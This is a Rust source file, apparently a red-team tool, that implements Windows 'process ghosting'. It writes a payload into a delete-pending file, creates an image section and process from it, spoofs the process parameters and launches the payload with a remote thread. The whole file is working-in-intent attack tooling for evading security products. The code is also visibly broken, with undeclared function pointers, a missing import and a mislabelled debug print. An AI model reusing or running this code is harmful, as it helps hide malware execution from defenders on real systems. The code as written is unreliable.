use std::ptr;
use std::ffi::CString;
use std::fs::File;
use std::io::Read;
use std::mem::size_of;
use winapi::um::winnt::*;
use winapi::um::handleapi::*;
use winapi::um::memoryapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::winternl::*;
use winapi::shared::ntdef::*;
use winapi::shared::ntstatus::*;
use winapi::shared::basetsd::*;
use winapi::shared::minwindef::*;
use winapi::um::winbase::*;
use winapi::um::winuser::*;

const NTSUCCESS: NTSTATUS = 0x00000000;

struct PayloadData {
    size: DWORD,
    buf: Vec<u8>,
}

fn frinting() {
    println!("NtCreateSection : {:?}", pNtCreateSection);
    println!("NtQueryInformationProcess : {:?}", pNtQueryInformationProcess);
    println!("NtCreateProcessEx : {:?}", pNtCreateProcessEx);
    println!("RtlCreateProcessParametersEx : {:?}", pRtlCreateProcessParametersEx);
    println!("RtlInitUnicodeString : {:?}", pRtlInitUnicodeString);
    println!("NtSetInformationFile : {:?}", pRtlInitUnicodeString);
}

fn create_section_from_delete_pending_file(ghost_file: &str, payload: &PayloadData) -> HANDLE {
    let ghost_file_cstr = CString::new(ghost_file).expect("CString::new failed");
    let h_file = unsafe {
        CreateFileA(
            ghost_file_cstr.as_ptr(),
            GENERIC_READ | GENERIC_WRITE | DELETE,
            FILE_SHARE_READ,
            ptr::null_mut(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            ptr::null_mut(),
        )
    };
    if h_file == INVALID_HANDLE_VALUE {
        println!("Opening file failed : {:?}", GetLastError());
        exit(0);
    }

    let mut iosb: IO_STATUS_BLOCK = Default::default();
    let mut info: FILE_DISPOSITION_INFORMATION = Default::default();
    info.DeleteFile = TRUE;
    let status = unsafe {
        pNtSetInformationFile(
            h_file,
            &mut iosb,
            &mut info as *mut FILE_DISPOSITION_INFORMATION as PVOID,
            size_of::<FILE_DISPOSITION_INFORMATION>() as ULONG,
            FileDispositionInformation,
        )
    };
    if status != NTSUCCESS {
        println!("NtSetInformationFile failed : {:?}", status);
    }

    let mut bytes_written: DWORD = 0;
    let success = unsafe {
        WriteFile(
            h_file,
            payload.buf.as_ptr() as LPCVOID,
            payload.size,
            &mut bytes_written,
            ptr::null_mut(),
        )
    };
    if !success {
        println!("Writing to ghost file failed : {:?}", GetLastError());
        exit(0);
    }

    let mut h_section: HANDLE = ptr::null_mut();
    let status = unsafe {
        pNtCreateSection(
            &mut h_section,
            SECTION_ALL_ACCESS,
            ptr::null_mut(),
            ptr::null_mut(),
            PAGE_READONLY,
            SEC_IMAGE,
            h_file,
        )
    };
    if status != NTSUCCESS {
        println!("NtCreateSection failed : {:?}", status);
    }

    unsafe {
        CloseHandle(h_file);
    }

    h_section
}

fn create_process_from_section(cover_file: &str, payload: &PayloadData, h_section: HANDLE) {
    let mut h_process: HANDLE = ptr::null_mut();
    let status = unsafe {
        pNtCreateProcessEx(
            &mut h_process,
            PROCESS_ALL_ACCESS,
            ptr::null_mut(),
            GetCurrentProcess(),
            PS_INHERIT_HANDLES,
            h_section,
            ptr::null_mut(),
            ptr::null_mut(),
            FALSE,
        )
    };
    if status != NTSUCCESS {
        println!("NtCreateProcessEx failed : {:?}", status);
        exit(0);
    }

    let p_dos_hdr = payload.buf.as_ptr() as *const IMAGE_DOS_HEADER;
    let p_nthdr = (payload.buf.as_ptr() as *const u8).offset(p_dos_hdr.e_lfanew as isize) as *const IMAGE_NT_HEADERS64;
    let entry_point_rva = p_nthdr.OptionalHeader.AddressOfEntryPoint;
    
    let mut pbi: PROCESS_BASIC_INFORMATION = Default::default();
    let status = unsafe {
        pNtQueryInformationProcess(
            h_process,
            ProcessBasicInformation,
            &mut pbi as *mut PROCESS_BASIC_INFORMATION as PVOID,
            size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            ptr::null_mut(),
        )
    };
    let mut temp_buf: [BYTE; 1000] = [0; 1000];
    let success = unsafe {
        ReadProcessMemory(
            h_process,
            pbi.PebBaseAddress,
            temp_buf.as_mut_ptr() as LPVOID,
            size_of::<PEB>() as SIZE_T,
            ptr::null_mut(),
        )
    };
    let base_addr = temp_buf.ImageBaseAddress as DWORD64;

    let entry_point = base_addr + entry_point_rva;

    let mut ustr: UNICODE_STRING = Default::default();
    let status = unsafe {
        pRtlInitUnicodeString(
            &mut ustr,
            cover_file.as_ptr() as *const WCHAR,
        )
    };

    let mut process_params: PRTL_USER_PROCESS_PARAMETERS = ptr::null_mut();
    let status = unsafe {
        pRtlCreateProcessParametersEx(
            &mut process_params,
            &ustr,
            ptr::null_mut(),
            ptr::null_mut(),
            &ustr,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            RTL_USER_PROC_PARAMS_NORMALIZED,
        )
    };
    if status != NTSUCCESS {
        println!("RtlCreateProcessParametersEx failed : {:?}", status);
        exit(0);
    }

    let size = process_params.EnvironmentSize + process_params.MaximumLength;
    let mut memory_ptr = process_params as LPVOID;
    let mem_allocation = unsafe {
        VirtualAllocEx(
            h_process,
            memory_ptr,
            size as SIZE_T,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    if mem_allocation.is_null() {
        println!("Unable to allocate memory in remote process : {:?}", GetLastError());
        exit(0);
    }

    let success = unsafe {
        WriteProcessMemory(
            h_process,
            process_params as LPVOID,
            process_params as LPCVOID,
            size as SIZE_T,
            ptr::null_mut(),
        )
    };
    if !success {
        println!("Unable to update process parameters : {:?}", GetLastError());
        exit(0);
    }

    let peb_addr = pbi.PebBaseAddress as *mut PEB;
    let success = unsafe {
        WriteProcessMemory(
            h_process,
            &mut (*peb_addr).ProcessParameters as *mut LPVOID,
            &process_params as *const PRTL_USER_PROCESS_PARAMETERS as LPCVOID,
            size_of::<DWORD64>() as SIZE_T,
            ptr::null_mut(),
        )
    };
    if !success {
        println!("Unable to update PEB : {:?}", GetLastError());
        exit(0);
    }

    let h_thread = unsafe {
        CreateRemoteThread(
            h_process,
            ptr::null_mut(),
            0,
            entry_point as LPTHREAD_START_ROUTINE,
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        )
    };
    if h_thread.is_null() {
        println!("Unable to create remote thread : {:?}", GetLastError());
        exit(0);
    }

    unsafe {
        CloseHandle(h_thread);
        CloseHandle(h_process);
        CloseHandle(h_section);
    }
}

fn ghost_process(ghost_file: &str, cover_file: &str, payload: &PayloadData) {
    // frinting();

    let h_section = create_section_from_delete_pending_file(ghost_file, payload);

    create_process_from_section(cover_file, payload, h_section);
}

fn get_payload_content(payload_file: &str) -> PayloadData {
    let mut file = File::open(payload_file).expect("File not found");
    let mut buf = Vec::new();
    file.read_to_end(&mut buf).expect("Failed to read file");

    PayloadData {
        size: buf.len() as DWORD,
        buf: buf,
    }
}

fn main() {
    let cover_file = "C:\\Users\\Default\\Desktop\\i_dont_exist.txt";
    let ghost_file = "C:\\Users\\Default\\Desktop\\tmp.txt";

    println!("\x1B[31m:::::::::::::::::::::::::::::::::::::::::::::::::\x1B[0m");
    println!("\x1B[31m:::::::::::::::::::::::::::::::::::::::::::::::::\x1B[0m");
    println!("\x1B[31m:::::::::::::::::::::::::::::::::::::::::::::::::\x1B[0m");
    println!("\x1B[31m:::::::::::::::::::::::::::::::::::::::::::::::::\x1B[0m");
    println!("\x1B[31m:::::::::Red Team Ghosting by @michredteam:::::::\x1B[0m");
    println!("\x1B[31m:::::::::::::::::::::::::::::::::::::::::::::::::\x1B[0m");
    println!("\x1B[31m:::::::::::::::::::::::::::::::::::::::::::::::::\x1B[0m");
    println!("\x1B[31m:::::::::MITRE ATT&CK Tactics and Techniques:::::\x1B[0m");
    println!("\x1B[31m::::::::::::::::::::T1574.008::::::::::::::::::::\x1B[0m");
    println!("\x1B[31m:::::::::::::::::::::::::::::::::::::::::::::::::\x1B[0m");

    let args: Vec<String> = std::env::args().collect();
    if args.len() > 1 {
        let payload_file = &args[1];
        let payload = get_payload_content(payload_file);
        ghost_process(ghost_file, cover_file, &payload);
    } else {
        let payload_file = "C:\\Windows\\system32\\cmd.exe";
        let payload = get_payload_content(payload_file);
        ghost_process(ghost_file, cover_file, &payload);
    }
}
